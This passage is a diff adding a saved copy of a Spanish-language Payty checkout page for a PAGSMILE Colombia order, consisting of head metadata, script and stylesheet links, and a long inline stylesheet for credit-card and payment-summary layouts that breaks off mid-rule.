@@ -1,0 +1,4270 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!doctype html>
+
+
+
+	
+	<html xml:lang="es" lang="es">
+	
+<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
+	
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	
+	<title>Payty</title>
+
+	<meta name="robots" content="noindex"/>
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<meta name="apple-mobile-web-app-capable" content="yes"/>
+
+    	<link rel="shortcut icon" type="image/x-icon" href="https://static.payty.com/static/commons-br/d/4kDl9MsWNKtJLDh6jK2WaA--/responsive/site/favicon.ico"/>
+	
+		
+<script  src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+
+<script src="https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/javascript/jquery.validate-1.19.1.min.js" ></script>
+
+<script src="https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/javascript/script.js" ></script>
+
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous" />
+
+<link rel="stylesheet" type="text/css" href="https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/css/pse-rest.css" />
+
+<link href="https://fonts.googleapis.com/css?family=Roboto:400,300,100" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="style.css">
+		
+
+			<meta name="status" content="INCOMPLETE">
+					<meta name="ecsOrderId" content="504d3854a9c84a96b0427158b886473b">
+			
+	<meta name="shop_label" content="PAGSMILE">
+	<meta name="merchantSiteId" content="10454805">
+	<meta name="legal_name_label" content="PAGSMILE COLOMBIA S.A.S">
+	<meta name="orderId" content="2024070223262302978">
+	<meta name="transaction_amount_label" content="500.000,00 COP">
+	
+			
+			
+
+
+	<style type="text/css">
+        /* Global */
+* {
+    box-sizing: border-box;
+}
+ 
+body,
+html {
+    height: 100%;
+    min-height: 100%;
+}
+ 
+body {
+    font-family: 'Roboto',
+    sans-serif;
+    margin: 0;
+    background-color: #e7e7e7;
+}
+/* Credit Card */
+.credit-card {
+    width: 360px;
+    height: 400px;
+    margin: 60px auto 0;
+    border: 1px solid #ddd;
+    border-radius: 6px;
+    background-color: #fff;
+    box-shadow: 1px 2px 3px 0 rgba(0,0,0,.10);
+}
+.form-header {
+    height: 60px;
+    padding: 20px 30px 0;
+    border-bottom: 1px solid #e1e8ee;
+}
+ 
+.form-body {
+    height: 340px;
+    padding: 30px 30px 20px;
+}
+/* Title */
+.title {
+    font-size: 18px;
+    margin: 0;
+    color: #5e6977;
+}
+/* Common */
+.card-number,
+.cvv-input input,
+.month select,
+.year select {
+    font-size: 14px;
+    font-weight: 100;
+    line-height: 14px;
+}
+ 
+.card-number,
+.month select,
+.year select {
+    font-size: 14px;
+    font-weight: 100;
+    line-height: 14px;
+}
+ 
+.card-number,
+.cvv-details,
+.cvv-input input,
+.month select,
+.year select {
+    opacity: .7;
+    color: #86939e;
+}
+/* Card Number */
+.card-number {
+    width: 100%;
+    margin-bottom: 20px;
+    padding-left: 20px;
+    border: 2px solid #e1e8ee;
+    border-radius: 6px;
+}
+/* Date Field */
+.month select,
+.year select {
+    width: 145px;
+    margin-bottom: 20px;
+    padding-left: 20px;
+    border: 2px solid #e1e8ee;
+    border-radius: 6px;
+    background: url('caret.png') no-repeat;
+    background-position: 85% 50%;
+    -moz-appearance: none;
+    -webkit-appearance: none;
+}
+ 
+.month select {
+    float: left;
+}
+ 
+.year select {
+    float: right;
+}
+.cvv-input input {
+    float: left;
+    width: 145px;
+    padding-left: 20px;
+    border: 2px solid #e1e8ee;
+    border-radius: 6px;
+    background: #fff;
+}
+ 
+.cvv-details {
+    font-size: 12px;
+    font-weight: 300;
+    line-height: 16px;
+    float: right;
+    margin-bottom: 20px;
+}
+ 
+.cvv-details p {
+    margin-top: 6px;
+}
+/* Buttons Section */
+.paypal-btn,
+.proceed-btn {
+    cursor: pointer;
+    font-size: 16px;
+    width: 100%;
+    border-color: transparent;
+    border-radius: 6px;
+}
+ 
+.proceed-btn {
+    margin-bottom: 10px;
+    background: #7dc855;
+}
+ 
+.paypal-btn a,
+.proceed-btn a {
+    text-decoration: none;
+}
+ 
+.proceed-btn a {
+    color: #fff;
+}
+ 
+.paypal-btn a {
+    color: rgba(242, 242, 242, .7);
+}
+ 
+.paypal-btn {
+    padding-right: 95px;
+    background: url('paypal-logo.svg') no-repeat 65% 56% #009cde;
+}
+
+
+
+/* common_web */
+
+#footnotes {
+    margin-right: auto;
+    margin-left: auto;
+    margin-top: 30px;
+    position: relative;
+    top: 0px;
+    left: 0;
+    width: 700px;
+    background: transparent bottom right no-repeat;
+}
+
+.extranotes {
+    text-align : left;
+    font-size : x-small;
+}
+
+.donationRecipientImg
+{
+    float:left;
+    width:180px;
+    margin-right:20px;
+    margin-bottom:20px;
+}
+
+.donationSlider
+{
+    position:relative;
+    top:8px;
+}
+
+.ie10 .donationSlider
+{
+    top:1px;
+    padding-left:3px;
+    padding-right:7px;
+}
+
+.ie10 .donationSlider::-ms-tooltip
+{
+    display:none;
+}
+
+.donationSeparator
+{
+    clear:both;
+}
+
+#donationBlock
+{
+    margin-right: auto;
+    margin-left: auto;
+    margin-top: 30px;
+    font-size: 0.9em;
+    color: #7f7f7f;
+}
+
+.donationContent
+{
+    line-height: normal;
+    text-align: left;
+}
+
+
+.donationContent div
+{
+    clear: both;
+    margin-top: 13px;
+}
+
+.donationRecipient, .donationContributionRecipient
+{
+    font-weight: bold;
+    color: #3775ba;
+}
+
+.donationExplanation
+{
+    padding-top: 13px;
+}
+
+.donationExplanationWithContribuion
+{
+    margin-bottom: 30px;
+}
+
+#cardDataInputBlock.donationCardInputBlock
+{
+    padding-top: 0px;
+    margin-top: 0px;
+}
+
+.donationTicket
+{
+    margin-right: auto;
+    margin-left: auto;
+    margin-top: 30px;
+    margin-bottom: 25px;
+    text-align: left;
+    line-height: normal;
+    font-weight: bold;
+    font-style: italic;
+}
+
+.donationContributionCaption
+{
+    padding-top: 10px;
+    font-weight: bold;
+    color: #3775ba;
+}
+
+.donationContribution
+{
+    font-weight: bold;
+}
+
+.InfosPayFootnote a:visited
+{
+    color: #3775ba;
+}
+
+/*
+* SDD PLUGIN
+*/
+#sddPaymentForm {
+    text-align:left;
+}
+.mandatory {
+    color: #e75e23;
+    font-size: 14px;
+    font-weight: 700;
+    position: absolute;
+    top: 0;
+    margin: 0;
+    padding: 0;
+    right: 0;
+}
+
+.mandatory-text {
+    font-size: 12px;
+    text-align: right;
+    clear: both;
+    display: block;
+    padding: 20px 0 0;
+    color: #e75e23;
+}
+
+.shopSupportInfo {
+	color : #7f7f7f;
+	background-color: #f5f5f5;
+    padding: 10px;
+	text-align: center;
+}
+
+#sddPaymentForm .paramLabel, .form_line .paramLabel {
+    display: inline;
+    float: left;
+    clear: left;
+    width: 27%;
+    text-align: right;
+    margin: 8px 3% 0 0;
+    font-size: 14px;
+    position: relative;
+    padding: 0 2% 0 0;
+}
+#sddPaymentForm .paramInput, .paramInput {
+    display: inline;
+    float: left;
+    margin: 0;
+    max-width: 70%;
+    padding: 0;
+    width: 100%;
+}
+#sddPaymentForm .paramInputDisplay {
+    margin-top:8px;
+}
+#sddPaymentForm .message,.mess_small {
+    clear: both;
+}
+#sddPaymentForm .formSection {
+    test-align:left;
+}
+#sddPaymentForm .formSectionTitle {
+    font-weight: 500;
+    font-size: 22px;
+    text-align: left;
+    margin: 1em 0 0;
+}
+
+#sddPaymentForm .help_anchor {
+    margin-top: 0;
+}
+
+#sddDisclaimer {
+    width: 90%;
+    font-family: sans-serif;
+    display: inline-block;
+    zoom: 1;
+    letter-spacing: normal;
+    word-spacing: normal;
+    vertical-align: top;
+    text-rendering: auto;
+}
+
+#sddAgreementConfirm{
+    width: 8%;
+    display: inline-block;
+    zoom: 1;
+    letter-spacing: normal;
+    word-spacing: normal;
+    vertical-align: top;
+    text-rendering: auto;
+}
+
+/*
+* Payment options
+*/
+.paramInput ul#paymentOptions {
+    margin: 0px;
+}
+
+ul#paymentOptions {
+    width:100%;
+    text-align: left;
+}
+
+ul#paymentOptions li {
+    width: 100%;
+    margin: 2px 0px 0px 0px;
+}
+
+ul#paymentOptions input[type="radio"] {
+    vertical-align: middle;
+    width: 20px;
+}
+
+ul#paymentOptions label {
+    float: none;
+    width: auto;
+    margin: 0px;
+    padding: 0px;
+    vertical-align: middle;
+    text-align: left;
+}
+
+/*
+* CADEAU BRICE
+*/
+.aide_cadeau {
+    display: inline;
+    margin-left: 10px;
+}
+
+#aide_cadeau_1 {
+    position: absolute;
+    display:none;
+    z-index: 100;
+    min-width: 200px;
+    max-width: 400px;
+}
+
+
+.aide_cadeau:hover #aide_cadeau_1 {
+    display:inline;
+    right: 0;
+    margin-top: 12px;
+    background: #ffffff;
+    border: 1px dotted;
+    padding: 5px;
+}
+
+#aide_cadeau_2 {
+    position: absolute;
+    display:none;
+    z-index: 100;
+    min-width: 200px;
+    max-width: 400px;
+}
+
+
+.aide_cadeau:hover #aide_cadeau_2 {
+    display:inline;
+    right: 0;
+    margin-top: 12px;
+    background: #ffffff;
+    border: 1px dotted;
+    padding: 5px;
+}
+
+.aide:hover {
+    border: 1px solid black;
+}
+
+.aide:hover #aide_cadeau_1  {
+    display:inline;
+    right: 0;
+    margin-top: 12px;
+    background: #ffffff;
+    border: 1px dotted;
+    padding: 5px;
+}
+
+/*
+* CREDIT CARD PLUGIN
+*/
+
+#creditCardPaymentForm .help_anchor, #wholeform .help_anchor {
+    float: left;
+    width: 16.6667%;
+    margin: 5px 0 0;
+}
+
+#cvvid {
+    float: left;
+}
+
+#expiration_date, #birth_date {
+    float: left;
+    width:83.33%;
+    display:inline-block;
+}
+
+
+#expiration_date #vads-expiry-month-input {
+    width : 41.6667%;
+    float:left;
+}
+
+#expiration_date #vads-expiry-year-input {
+    width : 45%;
+    float:right;
+}
+
+/* FIX ME */
+#birth_date select {
+    width:30%;
+}
+
+
+/*
+* COMMONS PLUGIN
+*/
+.info {
+    font-size: 12px;
+    text-align: left;
+    color:#220000;
+    display:inline;
+}
+.info-titulaire{
+    font-size: 14px;
+    margin: .5em 0 2em;
+}
+.form_line {
+    display:block;
+    float:left;
+    width:100%;
+    margin: 0 0 1.2em;
+}
+
+.InfosPaySpacer {
+    padding-bottom: 0px;
+}
+
+.InfosPayFootnote {
+    border-top: 1px solid #999999;
+    font-style: italic;
+    font-weight: normal;
+    padding-top: 6px;
+}
+
+#creditCardPaymentForm .copyrightThreeDS {
+    margin-left: 30%;
+}
+
+#paymentSummary > .copyrightThreeDS {
+    text-align: center;
+}
+
+
+/* Adjusts for templates v1 */
+.backShopAndLang {
+/*	height: 35px; */
+}
+
+.infoTransactionTable{
+    color: white;
+    table-layout: fixed;
+}
+
+#multiPaymentMeanBlock {
+    padding: 10px;
+    text-align: center;
+    float: left;
+    border: 2px solid #CCCCCC;
+    border-radius: 3px;
+    margin-left: 20px;
+    width: 445px;
+    margin-top: 40px;
+    margin-bottom: 40px;
+}
+
+.multiIdentifier{
+    padding: 10px;
+    text-align: left;
+    float: left;
+    border: 2px solid #CCCCCC;
+    border-radius: 3px;
+    margin-left: 20px;
+    width: 445px;
+    margin-top: 15px;
+    margin-bottom: 40px;
+}
+
+.multiIdentifier ul{
+    display: table;
+    list-style: none;
+}
+
+.multiIdentifier li.donneeCardImage{
+    margin-top: 10px;
+    margin-bottom: 10px;
+}
+
+.identRow {
+    display: inline-block;
+    width: 100%;
+}
+
+.identColumn {
+    display: inline-block;
+    vertical-align: middle;
+    margin-right: 10px;
+}
+
+#retryPaymentBlock {
+    margin-top: 25px;
+    margin-bottom: 25px;
+}
+.donneeCardImage img {
+    height: 25px;
+}
+
+table#paymentMeans {
+    border: 1px solid #999999;
+    border-spacing: 0;
+    display: inline-table;
+    border-collapse: collapse;
+}
+
+#paymentMeans .title_table {
+font-size: 12px;
+}
+
+#paymentMeans .donneeCardImage {
+    border-bottom: 1px solid #999999;
+}
+
+#paymentMeans .donneeLongIdent {
+    border-right: 1px solid #999999;
+    border-bottom: 1px solid #999999;
+    padding-left: 10px;
+    padding-right: 10px;
+    text-align: right;
+}
+
+#paymentMeans .donneeNumerique {
+    border-bottom: 1px solid #999999;
+    padding-left: 10px;
+    padding-right: 5px;
+    text-align: right;
+}
+
+#paymentMeans .donneeIcon {
+    border-bottom: 1px solid #999999;
+    padding-left: 5px;
+    padding-right: 5px;
+    text-align: center;
+    width: 45px;
+}
+
+#paymentMeans .color1 {
+    background-color: #FFFFFF;
+    font-size: 12px;
+}
+
+#paymentMeans .color2 {
+    background-color: #FFFFFF;
+    font-size: 12px;
+}
+
+.subtitle_table {
+    font-size: 12px;
+    color:#333333;
+    padding-left:10px;
+    background-color:#e3e3e3;
+    height:20px;
+    text-align:left;
+}
+
+#message_mode_test {
+    color: red;
+}
+
+.warning_testMode {
+    color: red;
+}
+
+#multiPaymentMeanBlock{
+    border: 2px solid #293c7a;
+    color: #767171;
+}
+
+.multiIdentifier {
+	border: 2px solid #293c7a;
+}
+
+#paymentMeans .color1 {
+    color: #767171;
+}
+
+.mess_small{
+    font-style: italic;
+    font-size: 0.75em;
+    color:#7F7F7F;
+}
+
+table#paymentMeans {
+    border: 0px;
+    border-spacing: 0;
+    display: inline-table;
+    border-collapse: collapse;
+    width: 100%;
+}
+
+#paymentMeans .color1 {
+    color: #767171;
+    height: 30px;
+}
+
+#paymentMeans .color2 {
+    height: 30px;
+}
+
+#paymentMeans .donneeCardImage {
+    border-bottom: 0px;
+}
+
+#paymentMeans .donneeLongIdent {
+    border-right: 0px;
+    border-bottom: 0px;
+}
+
+#paymentMeans .donneeNumerique {
+    border-bottom: 0px;
+}
+
+#paymentMeans .donneeIcon{
+    border-bottom: 0px;
+}
+
+.subtitle_table {
+    color: #767171;
+    padding-left: 10px;
+    background-color: #D6E4AA;
+    height: 30px;
+    text-align: left;
+    font-weight: bold;
+}
+
+#paymentMeans .title_table {
+    color: #767171;
+    background-color: #f5f5f5;
+    font-weight: bold;
+    height: 30px;
+}
+
+span.titleValue {
+    color: #293c7a;
+    font-size:1.1em;
+}
+
+#multiPaymentMeanBlock .titleContainer{
+    display: block;
+    margin-bottom: 10px;
+}
+
+.multiIdentifier .titleContainer{
+    margin-bottom: 10px;
+    text-align: center;
+    display: inline-block;
+    width: 100%;
+ } 
+
+#multiPaymentMeanBlock, .multiIdentifier {
+    width: 102%;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.imgElt:hover {
+border-color: #293c7a;
+}
+
+button.pdfLink {
+    background-image:url('https://static.payty.com/static/commons-br/pdf_white_logo.png');
+    background-repeat: no-repeat;
+    background-position: 9px 50%;
+	padding-left: 42px;
+	padding-right: 16px;
+    margin-top: 20px;
+}
+
+button em {
+    font-style: normal;
+}
+
+#shopLogo > p {
+    margin-top: 40px;
+    margin-bottom: 40px;
+}
+
+.transactionTitle img {
+    height: 30px;
+}
+
+.transactionTitle {
+    margin-bottom: 20px;
+}
+
+#paymentMeans > .title_table {
+font-size: 12px;
+color: #767171;
+padding-left: 10px;
+text-align: left;
+font-weight: bold;
+}
+
+#multiPaymentMeansNotice{
+margin-top: 10px;
+}
+
+.separatorBar {
+    display: block;
+    height: 1px;
+    border: 0;
+    border-bottom: 1px solid #fff;
+    margin: 1em 0;
+    padding: 10px;
+    clear:both;
+}
+
+#TopBlockRedirect {
+    width: 100%;
+    margin: 0px;
+    display: block;
+    clear: both;
+}
+
+#TopBlockError {
+    width: 100%;
+    margin: 0px;
+    display: block;
+    clear: both;
+}
+
+.mess_error {
+    font-size: 0.9em;
+    font-weight: normal;
+    color: red;
+}
+
+.subtitle{
+    font-size: 18px;
+    display: inline;
+    padding: 0 0 0 1em;
+    line-height: 100px;
+    font-weight: 300;
+}
+
+#multiPaymentResult{
+font-weight:bold;
+}
+
+th.InfosPayLeft{
+    width:50%;
+}
+
+td.InfosPayRight{
+font-weight:bold;
+width:50%;
+}
+
+.multiPaymentCardNumber{
+width:33%;
+}
+
+ .trashButton {
+    background-image: url('https://static.payty.com/static/commons-br/trash.png');
+    background-repeat: no-repeat;
+    background-position: center center;
+    cursor: pointer;
+    display: inline-block;
+    height: 16px;
+    width: 16px;
+}
+
+.trashButton:hover {
+    background-image: url('https://static.payty.com/static/commons-br/trash_hover.png') ;
+}
+
+.editButton {
+    background-image: url('https://static.payty.com/static/commons-br/mini_edit.png');
+    background-repeat: no-repeat;
+    background-position: center center;
+    cursor: pointer;
+    display: inline-block;
+    height: 16px;
+    width: 16px;
+}
+
+#pleaseWaitDiv {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  z-index: 100;
+  border-radius: 3px;
+}
+
+#pleaseWaitPanel {
+    background-color: white;
+    padding: 20px;
+    font-size: 0.9em;
+}
+
+#blockScreen {
+    position: fixed;
+    left: 0;
+    top: 0;
+    bottom: 0;
+    right: 0;
+    z-index: 50;
+    visibility: hidden;
+}
+#blockScreenBackground {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background: #000;
+    opacity: 0.5;
+    filter: alpha(opacity=50);
+}
+
+#validationButtonWrapper, #askMultiPaymentMeanButtonWrapper {
+    text-align: center;
+}
+
+.backShopDown {
+  float: right;
+  margin-top: 10px;
+  display: none;
+}
+
+
+.title_table > .titleValue {
+    width: 88%;
+}
+
+span.paramTitle {
+  display: block;
+  margin-bottom: 25px;
+    font-size: 0.9em;
+    color: #7f7f7f;
+}
+
+#cardDataInputBlock ul {
+  margin: 5px;
+  float: left;
+  list-style-type: none;
+  display: inline-grid;
+  font-size: 0.9em;
+    color: #7f7f7f;
+}
+
+.paramInput > input[type="radio"],
+.paramInput > input[type="checkbox"] {
+  vertical-align: middle;
+}
+
+li.paramInput {
+ width: 250px;
+}
+
+input.formControl {
+    float: left;
+    width: 83.3333%;
+}
+
+#voidServerUrl {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  -moz-transform: translate(-50%, -50%);
+  -webkit-transform: translate(-50%, -50%);
+  -o-transform: translate(-50%, -50%);
+  -ms-transform: translate(-50%, -50%);
+  transform: translate(-50%, -50%);
+  z-index: 100;
+  border-width: 8px;
+  border-style: solid;
+  border-radius: 3px;
+}
+
+#voidServerUrlPanel {
+  background-color: white;
+  padding: 30px 30px 20px 30px;
+  font-size: 0.9em;
+}
+
+#voidServerUrlButton {
+  background-color: white;
+  padding-top: 30px;
+  font-size: 0.9em;
+  text-align: center;
+}
+
+#installments {
+    width: 100%;
+    background-color: #FFFFFF;
+}
+
+.donneeLongIdent, .donneeDate, .donneeNumerique {
+    text-align: center;
+}
+
+.color1Installments {
+    background-color: #293c7a;
+}
+
+.color2Installments {
+    background-color: #3775ba;
+}
+
+#validationButtonCard,
+#simulationButtonCard {
+    display: inline !important;
+}
+
+#shopLogo > p{
+    display: none;
+}
+
+.pdfLink,
+#printButton {
+    max-width : 75%;
+}
+
+.pdfLink > div {
+    overflow: hidden;
+    white-space: nowrap;
+    text-overflow: ellipsis;
+}
+
+#newThemeButton, .backToBoutiqueButton > svg {
+	display: none;
+}
+#messageCurrConversion {
+    font-size: 12px;
+    font-style: italic;
+}
+
+/*! normalize.css v3.0.1 | MIT License | git.io/normalize */html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid #c0c0c0;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}
+
+/*	Neutralize padding introduced by user agent	for lists*/
+
+div ul {
+    padding-left: 0px;
+}
+
+/* ==================
+   Base styles: opinionated defaults
+   ================== */
+
+html {
+    color: #000000;
+    font-size: 14px;
+    line-height: 1.4;
+    font-family: sans-serif;
+}
+
+/*
+ * Remove text-shadow in selection highlight:
+ * https://twitter.com/miketaylr/status/12228805301
+ *
+ * These selection rule sets have to be separate.
+ * Customize the background color to match your design.
+ */
+
+::-moz-selection {
+    background: #b3d4fc;
+    text-shadow: none;
+}
+
+::selection {
+    background: #b3d4fc;
+    text-shadow: none;
+}
+
+/*  A better looking default horizontal rule  */
+
+hr {
+    display: block;
+    height: 1px;
+    border: 0;
+    border-top: 1px solid #ccc;
+    margin: 1em 0;
+    padding: 0;
+}
+a{
+    color:inherit;
+}
+/*
+ * Remove the gap between audio, canvas, iframes,
+ * images, videos and the bottom of their containers:
+ * https://github.com/h5bp/html5-boilerplate/issues/440
+ */
+
+audio,
+canvas,
+iframe,
+img,
+svg,
+video {
+    vertical-align: middle;
+    height: auto;
+}
+
+/* Remove default fieldset styles.  */
+
+
+fieldset {
+    border: 0;
+    margin: 0;
+    padding: 0;
+}
+
+/*
+ * Allow only vertical resizing of textareas.
+ */
+
+textarea {
+    resize: vertical;
+}
+
+/* ==========================================================================
+   Browser Upgrade Prompt
+   ========================================================================== */
+
+.browserupgrade {
+    margin: 0.2em 0;
+    background: #ccc;
+    color: #000;
+    padding: 0.2em 0;
+}
+
+.color1,
+.title-1,
+#cardDataInputBlock .titleContainer,
+#paymentResult .titleContainer,
+.choiceMessageLabel,
+.title-2,
+.transactionTitle,
+#paymentSummary .titleContainer{
+    color:#293c7a;
+}
+.color2,
+.normalFont,
+.backToBoutiqueButton,
+.selectLang,
+.message .symbole,
+#shopLogo p{
+    color: #2F2F2F;
+}
+.color3,
+.smallTxt,
+.paymentMeanList .txtElt{
+    color:#393939;
+}
+.color4,
+.smallTxt2,
+.copyright{
+    color:#7f7f7f;
+}
+.color5,
+.bckgdColor1,
+#transactionData,
+#headerTitle{
+    color:white;
+}
+.color6,
+.bckgdColor2,
+#validationButtonPaymentMean,
+#validationButtonCard,
+#simulationButtonCard,
+#backToBoutiqueBlock button,
+#retryPaymentButton,
+.pdfLink,
+.amount,
+#printButton {
+    color:#e9e9e9;
+}
+.smallTxt,
+.paymentMeanList .txtElt{
+    font-size:0.9em;
+}
+.smallTxt2,
+.copyright{
+    font-size:0.75em;
+}
+.normalFont,
+.backToBoutiqueButton,
+.selectLang,
+.message .symbole,
+#shopLogo p{
+    font-size: 14px;
+    font-weight: normal;
+}
+.title-1,
+.choiceMessageLabel{
+    font-size: 28px;
+    text-align: center;
+    font-weight: 500;
+}
+.title-2,
+.transactionTitle,
+#paymentSummary .titleContainer {
+    font-size:20px;
+    text-align:left;
+    font-weight: normal;
+    border-bottom-width:1px;
+    border-bottom-style:solid;
+    /*padding-bottom:16px;*/
+}
+#paymentResult .messageHeader {
+    font-size:20px;
+}
+.borderColor1,
+#cardDataInputBlock #paymentMeanSecureBlock{
+    border:none;
+}
+.borderColor2,
+.transactionTitle,
+#paymentSummary .titleContainer{
+    border-color:#c1c1c1;
+    margin-top: 30px;
+}
+.bckgdColor1,
+#transactionData{
+    background-color:#293c7a;
+    color:#fff;
+    font-size: 18px;
+}
+,
+#headerTitle{
+    color:#fff;
+    font-size: 18px;
+}
+.bckgdColor2,
+#validationButtonPaymentMean,
+#validationButtonCard,
+#simulationButtonCard,
+#askMultiPaymentMeanButton,
+#backToBoutiqueBlock button,
+#changePaymentMeanButton,
+#retryPaymentButton,
+.pdfLink,
+.amount,
+#donationInfoTotal,
+#printButton {
+    background-color:#3775ba;
+    color:white;
+}
+
+#shopLogo p{
+    text-align: center;
+}
+
+
+
+html {
+  box-sizing: border-box;
+}
+*, *:before, *:after {
+  box-sizing: inherit;
+}
+
+body{
+    background-color:#f5f5f5;
+}
+#container{
+    max-width:1140px;
+    margin: 0 auto;
+}
+
+#header {
+    background: #293c7a url('https://static.payty.com/static/commons-br/d/4kDl9MsWNKtJLDh6jK2WaA--/logo-payment.png') no-repeat;
+    background-position: 2em 50%;
+    height: 100px;
+    overflow: hidden;
+    color: #fff;
+    display: inline-block;
+    width: 100%;
+    margin: 20px 0 0;
+    position: relative;
+    vertical-align: top;
+}
+
+#headerTitle {
+    height: 80px;
+    line-height: 80px;
+    background: none;
+    background-color: transparent !important; /* Fix for legacy customization */
+    margin: 10px 0 0 105px;
+    float: left;
+    border-left: 1px solid #fff !important;
+    padding: 0 0 0 .5em;
+    font-size: 42px;
+    font-weight: normal;
+}
+
+
+#locales{
+    float:right;
+    padding-right:60px;
+    position:relative;
+}
+
+#backToBoutiqueForm,
+#locales > p{
+    display:inline-block;
+}
+#locales ul,
+#locales form,
+#locales > img{
+    display:none;
+}
+.backToBoutiqueButton{
+    background:none;
+    border:none;
+    margin-top:1em;
+    padding-left: 16px;
+    position: relative;
+}
+.backToBoutiqueButton:before{
+    content: "<";
+    font-family: "Arial Narrow";
+    font-size: 20px;
+    position: absolute;
+    left: 1px;
+    top: -3px;
+}
+#showHideLang{
+    background-color:#424242;
+    color:white;
+    font-weight:bold;
+    position:absolute;
+    top:0;
+    margin: 0;
+    right: 0;
+    padding-top: 16px;
+    width:50px;
+    height:54px;
+    font-size: 0.9em;
+    text-align:center;
+    border-bottom-right-radius: 3px;
+    border-bottom-left-radius: 3px;
+    cursor:pointer;
+    cursor:hand;
+}
+#showHideLang:hover{
+    box-shadow: 0 0 0 54px rgba(255, 255, 255, 0.2) inset;
+}
+#showHideLang:after{
+    content: "<";
+    font-family: "Arial Narrow";
+    font-size: 20px;
+    font-weight:bold;
+    position: absolute;
+    left: 20px;
+    bottom: -3px;
+    color:white;
+    -moz-transform: rotate(-90deg);
+    -webkit-transform: rotate(-90deg);
+    -o-transform: rotate(-90deg);
+    -ms-transform: rotate(-90deg);
+    transform:rotate(-90deg);
+}
+.listLang {
+    position: absolute;
+    z-index: 999;
+    right: 0;
+    list-style: none;
+    background-color: #424242;
+    color: white;
+    width: 150px;
+    padding: 12px;
+    margin-top: 0;
+    border-bottom-right-radius: 3px;
+    border-bottom-left-radius: 3px;
+}
+
+.listLang .active{
+    background-color:#676767;
+}
+.listLang li a {
+    text-decoration: none;
+}
+#locales .active + .listLang{
+    display:block;
+}
+
+#TopBlock,
+#rightBlock,
+.rightForm{
+    display:inline-block;
+    vertical-align:top;
+    -moz-box-sizing: border-box;
+}
+
+#TopBlock{
+    width:42.2%;
+    margin-right:4%;
+    margin-left:2%;
+}
+#rightBlock{
+    margin-top: -72px;
+}
+#rightBlock, .rightForm{
+    width: 50.2%;
+    background: #fff;
+    padding: 20px 40px;
+    position: relative;
+}
+.rightForm{
+    margin-top: 50px;
+}
+#shopLogo{
+    padding:50px 3.15% 0;
+}
+#transactionData .message {
+    padding-left: 18px;
+    padding-top: 30px;
+}
+.logoBoutique{
+    display: block;
+    margin: 0 auto 20px;
+}
+.infoTransactionTable,
+.infoTransactionEnd{
+    width:100%;
+    table-layout: fixed;
+}
+.infoTransactionTable th,
+.infoTransactionTable td{
+    padding:0.5em 18px;
+}
+th.infoTransactionLeft {
+    padding-right: 4px;
+}
+td.infoTransactionRight {
+    padding-left: 4px;
+}
+/*.infoTransactionEnd th,
+.infoTransactionEnd td{
+    padding:6px 14px;
+    font-size:0.9em;
+}*/
+.amount th,
+.amount td{
+    padding:18px;
+}
+
+#donationInfoTotalAmount,
+#donationInfoTotalCurrency{
+    font-size:1.6em;
+}
+.infoTransactionTable caption,
+.infoTransactionTable th,
+.infoTransactionEnd th {
+    font-weight:normal;
+    text-align:left;
+    vertical-align: top;
+}
+.infoTransactionTable caption{
+    font-size:1.1em;
+    padding:12px 18px 20px;
+}
+.infoTransactionTable th + td,
+.infoTransactionEnd th + td{
+    text-align:right;
+    word-wrap: break-word;
+}
+.choiceMessageLabel{
+    margin:0 0 60px;
+}
+.paymentMeanList{
+    margin-left: -10px;
+    text-align:center;
+}
+.paymentMeanList label{
+    display:inline-block;
+    margin:0 0 36px 20px;
+}
+.imgElt{
+    padding:8px 18px;
+    border:2px solid #ffffff;
+    border-radius:3px;
+    display:block;
+    text-align:center;
